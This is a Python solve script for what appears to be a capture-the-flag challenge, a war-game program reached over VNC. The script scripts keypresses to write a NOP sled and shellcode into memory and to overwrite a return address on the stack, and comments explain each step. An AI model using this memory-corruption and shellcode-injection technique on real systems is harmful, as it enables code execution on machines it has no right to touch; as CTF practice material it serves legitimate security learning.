from vncdotool import api
from binascii import unhexlify
from subprocess import check_output
import argparse
import time


SCREEN_WIDTH = 320
SCREEN_HEIGHT = 200
TOP_OF_STACK = 0xF000


class Client:
    def __init__(self, display, password=None, delay=.1):
        self._vnc = api.connect(display, password=password)
        self.color = 0xc # what color our cursor is
        self.cursor_pos = (160, 100) # where our cursor is
        self.delay = delay

    def press_key(self, key):
        """
        Probably don't use this much... the wrapper methods that manage
        the state properly will be much better!
        """
        #print('[+] PRESSING: {}'.format(key))
        self._vnc.keyPress(key)
        time.sleep(self.delay)
        # TODO: I'd love it if we did something more reliable than a sleep...
        # perhaps checking the display and seeing if it's changed

    def set_cursor_value(self, value):
        """
        Set the cursor value. Only call this during target selection!!
        """
        # TODO: it'd be nice to take advantage of wraparound if
        # abs(delta) were greater than 128...
        delta = value - self.color
        key = 'a' if delta < 0 else 'q'

        for _ in range(abs(delta)):
            self.press_key(key)

        self.color = value

    def move_cursor(self, x, y):
        curr_x, curr_y = self.cursor_pos
        dx, dy = x - curr_x, y - curr_y

        x_key = 'left' if dx < 0 else 'right'
        y_key = 'up' if dy < 0 else 'down'

        # move x
        for _ in range(abs(dx)):
            self.press_key(x_key)

        # move y
        for _ in range(abs(dy)):
            self.press_key(y_key)

        self.cursor_pos = (x, y)
    
    def move_up(self):
        self.press_key('up')
        x, y = self.cursor_pos
        self.cursor_pos = x, y-1

    def move_down(self):
        self.press_key('down')
        x, y = self.cursor_pos
        self.cursor_pos = x, y+1

    def move_left(self):
        self.press_key('left')
        x, y = self.cursor_pos
        self.cursor_pos = x-1, y

    def move_right(self):
        self.press_key('right')
        x, y = self.cursor_pos
        self.cursor_pos = x+1, y

    def save_screenshot(self, filename):
        self._vnc.captureScreen(filename)

    def __enter__(self):
        return self
    
    def __exit__(self, exc_type, exc_value, traceback):
        self._vnc.disconnect()


def addr_to_coords(addr):
    """ convert an address to a pair of coordinates """
    # addr = 0x10000 + (y * SCREEN_WIDTH) + x
    offset = addr - 0x10000
    x = offset % SCREEN_WIDTH
    y = (offset - x) // SCREEN_WIDTH
    return x, y


def parse_args():                                                               
    parser = argparse.ArgumentParser(
        description='Solve challenge!',
    )
    parser.add_argument(
        '--target',
        type=str,
        default=':0',
        help='VNC server running pwnable', 
    )
    parser.add_argument(
        '--password',
        type=str,
        default=None,
        help='Password for vnc server',
    )
    parser.add_argument(
        '--delay',
        type=float,
        default=.5,
        help='How long to wait between keypresses? .1 works fine locally, .5 seems safe for remote',
    )
    return parser.parse_args()                                                  


args = parse_args()
try:
    with Client(args.target, args.password, delay=args.delay) as client:
        # enter password
        for k in '-JOSHUA-':
            client.press_key(k)
except ValueError:
    pass

# wait for decrypt
time.sleep(2)
print('going to open new connection, vncdotool handles resizes poorly!')

with Client(args.target, args.password, delay=args.delay) as client:

    # select USA
    client.press_key('enter')

    print('Waiting for map to render...')
    time.sleep(20)

    # select left-most launch site, useful for aiming later
    client.press_key('left')
    client.press_key('left')

    # enter aiming mode
    client.press_key('enter')

    # ok, here's the real exploit :)
    shellcode = b'\x90' * 0xb0
    shellcode += open('shc', 'rb').read()
    # nopsled into jmp $-0x40.
    # basically a safety net if we land after the main part of the shellcode,
    # to ensure we still hit it
    shellcode += b'\x90' * 10 + b'\xeb\xbe'

    print('Shellcode is', repr(shellcode))
    
    # where we're gonna put the shellcode in memory...
    shellcode_addr = 0x10000 - len(shellcode) - 1

    print('shellcode will be written to 0x{:x}'.format(shellcode_addr))

    shc_x, shc_y = addr_to_coords(shellcode_addr)
    # put our position as the "write head"
    client.move_cursor(shc_x, shc_y + 2)

    # basically, if we move up from here, we'll write the top value
    # of our reticle to memory outside the display
    # then just do this for each shellcode value:
    #   1. set value of cursor to shellcode value
    #   2. move up to write
    #   3. move down
    #   4. move right
    #   5. repeat!
    # I suppose this could be done more quickly by sorting by byte value
    # and writing all those, then going back to the next closest one, etc
    # but that seems like just a lot of work!
    for i, v in enumerate(shellcode):
        print(f'writing index {i} / {len(shellcode)} of shellcode...')
        client.set_cursor_value(v)
        client.move_up()
        client.move_down()
        client.move_right()

    # now, we need to set up a return pointer aimed at our shellcode
    # one off from the top of the stack
    # We can't reach our cursor up that high... but we can certainly paint a
    # missile trajectory!
    stack_x, stack_y = addr_to_coords(TOP_OF_STACK)
    print('Stack @: {}, {}'.format(stack_x, stack_y))

    client.set_cursor_value(0xc) # set back to orange for appearances :>

    # reasonable place where our arc goes to the right things...
    # kinda got this by eye, lol
    print('moving cursor to stack overwrite position...')
    client.move_cursor(stack_x + 10, 10)

    print('Writing return addr of nopsled->shellcode...')
    # write return address of shellcode
    # overwrites the high byte of ret->main on stack with ff, pointing near our
    # shellcode (somewhere on either nopsled, hopefully!)
    print('writing ret')
    client.set_cursor_value(0xff)
    client.press_key('enter')
    time.sleep(2) # wait for the trajectory to go

    print('Ok, it should have jumped to the finish!')
    print('Saving screenshot as flag.png')
    client.save_screenshot('flag.png')
